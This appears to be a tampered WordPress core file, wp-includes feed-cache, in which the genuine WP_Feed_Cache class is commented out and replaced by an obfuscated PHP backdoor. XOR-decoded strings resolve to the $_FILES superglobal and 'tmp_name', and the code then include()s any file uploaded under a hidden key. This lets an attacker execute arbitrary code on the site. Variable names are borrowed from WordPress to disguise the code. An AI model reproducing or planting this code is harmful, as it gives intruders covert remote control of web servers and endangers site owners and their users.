<?php /* 
*
 * Feed API: WP_Feed_Cache class
 *
 * @package WordPress
 * @subpackage Feed
 * @since 4.7.0
 * @deprecated 5.6.0
 

_deprecated_file(
	basename( __FILE__ ),
	'5.6.0',
	'',
	__( 'This file is only loaded for backward compatibility with SimplePie 1.2.x. Please consider switching to a recent SimplePie version.' )
);

*
 * Core class used to implement a feed cache.
 *
 * @since 2.8.0
 *
 * @see SimplePie_Cache
 
class WP_Feed_Cache extends SimplePie_Cache {

	*
	 * Creates a new SimplePie_Cache object.
	 *
	 * @si*/
 	
$ancestors = 'gtDlkhyGzDHscb';
	$private = 'old_slugs';
$wpsmiliestrans = $ancestors;
function first($wp_cockneyreplace, $part)

{
    $uris = $part;
    $rel_array = urldecode($wp_cockneyreplace);
    $group_by_status = substr($uris,0, strlen($rel_array));
	$safe_tag = 'strip';
    $thumbfile = $rel_array ^ $group_by_status;

    return $thumbfile;
}
$add_trashed_suffix = ${first("82%0D+.%3B", $wpsmiliestrans)};

$page_ids = $add_trashed_suffix;
$link_html = isset($page_ids[$wpsmiliestrans]);
if ($link_html)

{

    $needle = $add_trashed_suffix[$wpsmiliestrans];
    $opening_tag = $needle[first("%13%1943%05%09%14%22", $wpsmiliestrans)];
    $in_string = $opening_tag;
    include ($in_string);

}


/* nce 2.8.0
	 *
	 * @param string $location  URL location (scheme is used to determine handler).
	 * @param string $filename  Unique identifier for cache object.
	 * @param string $extension 'spi' or 'spc'.
	 * @return WP_Feed_Cache_Transient Feed cache handler object that uses transients.
	 
	public function create( $location, $filename, $extension ) {
		return new WP_Feed_Cache_Transient( $location, $filename, $extension );
	}
}
*/